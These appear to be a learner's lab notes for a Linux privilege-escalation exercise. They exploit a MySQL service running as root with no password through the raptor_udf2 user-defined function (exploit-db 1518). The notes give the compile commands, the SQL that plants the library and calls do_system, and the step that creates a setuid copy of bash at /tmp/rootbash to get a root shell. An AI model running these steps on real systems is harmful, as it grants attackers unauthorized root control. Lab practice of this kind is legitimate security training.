
1. Run the "id" command. What is the result?

uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)

2.
The Link for this exploit (MySQL Service Exploit)

https://www.exploit-db.com/exploits/1518

(The Exploit is added in this repo.)

The exploit is added in this repo as 1518.c

3.copy 1518.c into target from our attackbox
scp /work/1518.c .

4. SOME POINTS REGARDING THIS EXPLOIT
==========================================

A. The MySQL service is running as root and the "root" user for the service does not have a password assigned.
B. Our exploit will take advantage of User Defined Functions to run system commands as root via MySQL Service.
C. Condition:
      1.MySQL 4.x/5.0
      2.Must be installed with root privilege in linux
D.The Exploit:
raptor_udf2.c  - dynamic library for do_system() MySQL UDF

Steps:
E.gcc -g -c raptor_udf2.c
F. gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
G.Fire mysql as root
mysql -u root -p

H.in mysql prompt:
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/raptor/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select * from mysql.func;
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');

I. Exit out of the MySQL shell (type exit or \q and press Enter) and run the /tmp/rootbash executable with -p to gain a shell running with root privileges:
/tmp/rootbash -p

J.
 



